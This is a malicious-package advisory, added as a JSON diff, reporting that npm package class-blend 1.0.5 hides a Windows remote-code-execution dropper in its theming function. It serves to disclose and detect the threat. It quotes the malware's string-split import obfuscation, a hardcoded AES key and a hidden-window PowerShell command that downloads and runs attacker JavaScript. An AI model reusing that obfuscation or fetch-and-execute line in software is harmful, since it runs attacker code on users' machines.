@@ -1,0 +1,75 @@
+{
+  "modified": "2026-05-24T17:10:54Z",
+  "published": "2026-05-24T17:10:54Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "Hidden Windows RCE dropper disguised as a theming utility",
+  "details": "class-blend@1.0.5 advertises itself as a class-merging / styling utility, but its exported applyGlobalStyles({palette, accents}) function in dist/index.js contains a covert Windows remote-code-execution dropper. The module dynamically imports node:crypto and node:child_process via string-split obfuscation (e.g. [\"no\",\"de\",\":\",\"cry\",\"pto\"].join(\"\")) to hide those imports from static scanners. Inside the function, a hardcoded AES-256-CBC key assembled from an array of hex chunks ([\"a7b80b01\",\"7e76fb52\",\"fa527621\",\"f76027d2\",\"19014dfc\",\"a59b49ae\",\"3db97ff3\",\"ab4a72fa\"].join(\"\")) is used together with caller-supplied palette/accents values as ciphertext and IV to decrypt a URL. The decrypted URL is then handed to a hidden-window PowerShell invocation: powershell.exe -WindowStyle Hidden -NoProfile -Command `irm \u003curl\u003e -o $env:TEMP\\s.js; node $env:TEMP\\s.js`, which downloads and executes attacker JavaScript on the host. Any consumer who installs this package and calls the documented theming API with the right inputs triggers arbitrary remote code execution on Windows. The split-string imports, hardcoded AES key, hidden PowerShell window, and complete mismatch between the stated purpose (CSS class helper) and the use of crypto + child_process + PowerShell leave no benign interpretation.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "class-blend"
+      },
+      "versions": [
+        "1.0.5"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/index.js",
+              "sha256": "e8113412636bd5c602bc9cdd9f4f989947d8271899da7963a0411830b966f1ad",
+              "tlsh": "e9c3ffcab1a23132d32b686048bf018bf377dda0177e4481d159a2adb63441ea5b7f7d"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "class-blend-1.0.5.tgz",
+              "hashes": {
+                "sha1": "5a227840814129be22dfc64d1a1c11e941c01078",
+                "sha512_sri": "sha512-e+2VKAQrtzzsb3YKU1EBIxi62i6l1yMgHdJDBifAEjhE79d2jG1+RvRQO/gxjQiKHGMbnYTpgkQdTPsPAn8koA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/class-blend/v/1.0.5"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "ad24204803f1c7a2deebb32ad36b5c4635820a06ecd3e0c00327a5215b56e89f",
+        "import_time": "2026-05-26T05:52:45.827932826Z",
+        "id": "IN-MAL-2026-004519",
+        "modified_time": "2026-05-24T17:10:54Z",
+        "versions": [
+          "1.0.5"
+        ]
+      }
+    ]
+  }
+}
